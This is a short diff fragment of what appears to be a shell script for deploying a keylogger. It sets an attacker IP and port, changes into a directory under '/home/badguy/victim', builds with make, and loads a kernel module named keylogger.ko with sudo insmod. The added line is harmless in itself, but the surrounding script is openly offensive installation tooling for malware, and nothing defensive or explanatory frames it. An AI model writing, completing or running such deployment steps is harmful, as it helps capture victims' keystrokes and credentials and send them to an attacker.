@@ -3,6 +3,8 @@
 ATTACKER_IP="192.168.99.10"
 ATTACKER_PORT=8080
 
+cd /home/badguy/victim
+
 make
 
 sudo insmod keylogger.ko
